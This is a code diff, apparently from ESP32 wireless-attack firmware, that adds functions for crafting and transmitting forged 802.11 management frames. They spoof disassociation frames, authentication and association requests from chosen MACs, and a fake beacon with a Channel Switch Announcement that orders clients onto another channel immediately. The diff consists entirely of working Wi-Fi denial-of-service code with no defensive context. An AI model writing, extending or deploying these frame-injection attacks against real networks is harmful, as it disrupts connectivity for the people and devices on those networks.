@@ -39,6 +39,106 @@ void wifi_attack_deauth_basic(const uint8_t dest[6], const uint8_t bssid[6], uin
 }
 
 
+void wifi_attack_send_disassoc(const uint8_t bssid[6], const uint8_t dest[6], uint8_t reason)
+{
+    uint8_t packet[26] = {
+        0xA0, 0x00,                         // Frame Control (Disassociation)
+        0x3A, 0x01,                         // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Target)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Sequence
+        0x00, 0x00                          // Reason Code
+    };
+
+    memcpy(&packet[4], dest, 6);
+    memcpy(&packet[10], bssid, 6);
+    memcpy(&packet[16], bssid, 6);
+    packet[24] = reason; 
+
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+}
+
+
+void wifi_attack_send_auth_frame(const uint8_t bssid[6], const uint8_t src_mac[6])
+{
+    uint8_t packet[30] = {
+        0xB0, 0x00,                         // Frame Control (Authentication)
+        0x3A, 0x01,                         // Duration
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Random MAC)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Sequence
+        0x00, 0x00,                         // Algorithm (Open System)
+        0x01, 0x00,                         // Transaction Sequence (1)
+        0x00, 0x00                          // Status Code (Success)
+    };
+
+    memcpy(&packet[4], bssid, 6);
+    memcpy(&packet[10], src_mac, 6);
+    memcpy(&packet[16], bssid, 6);
+
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+}
+
+
+void wifi_attack_send_assoc_req(const uint8_t bssid[6], const uint8_t src_mac[6])
+{
+    // Association Request minimale
+    uint8_t packet[50] = {
+        0x00, 0x00,                         // FC (Assoc Req)
+        0x3A, 0x01,                         // Duration
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Dest (BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Random)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Seq
+        0x11, 0x00,                         // Capab Info
+        0x0A, 0x00,                         // Listen Interval
+        // Tags...
+        0x00, 0x00,                         // SSID Tag (Empty)
+        0x01, 0x01, 0x82                    // Support Rates
+    };
+    
+    memcpy(&packet[4], bssid, 6);
+    memcpy(&packet[10], src_mac, 6);
+    memcpy(&packet[16], bssid, 6);
+
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+}
+
+
+void wifi_attack_send_csa_beacon(const uint8_t bssid[6], const uint8_t src_mac[6], uint8_t new_channel)
+{
+    // Beacon Frame spoofato con CSA IE (Tag 37)
+    // Questo dice ai client: "L'AP sta cambiando canale, spostatevi su X!"
+    
+    uint8_t packet[64] = {
+        0x80, 0x00,                         // FC (Beacon)
+        0x00, 0x00,                         // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest (Broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Seq
+        // Timestamp (8 bytes) dummy
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x64, 0x00,                         // Beacon Interval
+        0x11, 0x00,                         // Capab Info
+        // Tags
+        0x00, 0x00,                         // SSID (Empty/Hidden)
+        // CHANNEL SWITCH ANNOUNCEMENT IE (Tag 37)
+        0x25, 0x03,                         // Tag 37, Len 3
+        0x00,                               // Channel Switch Mode (0=No TX until switch)
+        new_channel,                        // New Channel Number
+        0x00                                // Channel Switch Count (0 = Immediately)
+    };
+
+    memcpy(&packet[10], bssid, 6);
+    memcpy(&packet[16], bssid, 6);
+
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+}
+
+
 void wifi_attack_deauth_client_invalid_PMKID(const uint8_t client[6], const uint8_t bssid[6])
 {
     if(client == NULL || bssid == NULL) return;
